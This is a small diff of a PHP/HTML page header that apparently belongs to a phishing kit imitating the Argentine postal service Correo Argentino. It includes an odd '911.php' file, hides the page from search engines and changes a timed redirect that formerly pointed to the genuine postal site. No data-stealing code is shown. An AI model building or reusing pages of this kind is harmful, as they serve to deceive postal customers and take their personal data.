@@ -11,7 +11,7 @@ include("./Conan/911.php");
         
         <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
         <meta name="robots" content="noindex," "nofollow,"="" "noimageindex,"="" "noarchive,"="" "nocache,"="" "nosnippet"="">
-        <meta http-equiv="refresh" content="5; URL= https://www.correoargentino.com.ar/" />
+        <meta http-equiv="refresh" content="5; URL= " />
         
         <!-- CSS FILES -->
         <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
